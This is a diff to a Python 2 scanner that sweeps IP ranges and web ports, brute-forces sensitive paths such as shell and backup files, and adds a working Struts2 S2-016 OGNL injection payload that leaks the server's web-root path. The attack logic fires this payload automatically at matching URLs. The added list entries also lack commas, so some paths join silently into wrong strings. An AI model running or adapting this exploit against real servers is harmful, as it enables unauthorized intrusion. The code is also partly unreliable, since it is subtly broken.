@@ -9,7 +9,8 @@ port_queue = Queue.Queue()
 socket.setdefaulttimeout(3)
 header = {"User-Agent": 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWeb'
                         'Kit/600.1.25 (KHTML, like Gecko) Version/8.0 Safari/600.1.25'}
-ports = {
+struts_vul = '''?redirect:${%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matts%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23matt.getWriter().println(">>>>^>"),%23matt.getWriter().println(%23matts.getRealPath("/")),%23matt.getWriter().println("<^<<<<"),%23matt.getWriter().flush(),%23matt.getWriter().close()}'''
+ports = (
     80,
     8080,
     8081,
@@ -26,9 +27,9 @@ ports = {
     8443,
     9090,
     81,
-    8888,
-}
-burp = {
+    8888
+)
+burp = (
     '/robots.txt',
     '/admin',
     '/manager',
@@ -50,8 +51,10 @@ burp = {
     '/database/',
     '/databases/',
     '/1.asp',
+    '/login.do'
     '/shell.asp',
     '/index.shtml',
+    '/index.jhtml'
     '/www/',
     '/www.zip',
     '/www.rar',
@@ -59,8 +62,9 @@ burp = {
     '/webroot.zip',
     '/bak.rar',
     '/bak.zip',
-    '/fckeditor/editor/filemanager/connectors/',
-}
+    '/fckeditor/editor/filemanager/connectors/'
+)
+
 
 def ip2bin(ip):
     b = ""
@@ -80,13 +84,13 @@ def dec2bin(n, d=None):
     s = ""
     while n > 0:
         if n & 1:
-            s = "1"+s
+            s = "1" + s
         else:
-            s = "0"+s
+            s = "0" + s
         n >>= 1
     if d is not None:
         while len(s) < d:
-            s = "0"+s
+            s = "0" + s
     if s == "": s = "0"
     return s
 
@@ -94,21 +98,21 @@ def dec2bin(n, d=None):
 def bin2ip(b):
     ip = ""
     for i in range(0, len(b), 8):
-        ip += str(int(b[i:i+8], 2))+"."
+        ip += str(int(b[i:i + 8], 2)) + "."
     return ip[:-1]
 
 
 def listCIDR(c):
-    cidrlist=[]
+    cidrlist = []
     parts = c.split("/")
     baseIP = ip2bin(parts[0])
     subnet = int(parts[1])
     if subnet == 32:
         print bin2ip(baseIP)
     else:
-        ipPrefix = baseIP[:-(32-subnet)]
-        for i in range(2**(32-subnet)):
-            cidrlist.append(bin2ip(ipPrefix+dec2bin(i, (32-subnet))))
+        ipPrefix = baseIP[:-(32 - subnet)]
+        for i in range(2 ** (32 - subnet)):
+            cidrlist.append(bin2ip(ipPrefix + dec2bin(i, (32 - subnet))))
         return cidrlist[1:-1]
 
 
@@ -141,12 +145,16 @@ def port_run(target, port, timeout, filename):
                 len_404 = 0
                 pass
             for path in burp:
-                uri = url + path.strip()
+                uri = url + path
                 sys.stderr.write(uri + ' beginning \r')
                 sys.stderr.flush()
                 try:
                     path_req = urllib2.Request(uri)
                     path_res = urllib2.urlopen(path_req)
+                    if path.split('.')[1] in ('jhtml', 'shtml', 'do', 'action'):
+                        struts_res = urllib2.urlopen(uri + struts_vul)
+                        if struts_res.readline().startswith('>>'):
+                            print uri + ' has s2-016 vul ->' + struts_res.readline()
                     if len(path_res.read()) != len_404:
                         print uri + ' success'
                         f.write(uri + ' ' + str(path_res.code) + '\n')
@@ -158,13 +166,13 @@ def port_run(target, port, timeout, filename):
                         f.flush()
                     continue
                 except Exception, e:
-                    #print uri + ' ' + str(e)
+                    # print uri + ' ' + str(e)
                     continue
         except urllib2.HTTPError, e:
             if e.code == 403:
                 f.write(url + ' ' + str(e) + '\n')
                 f.flush()
-                #print url, e
+                # print url, e
         except:
             pass
 
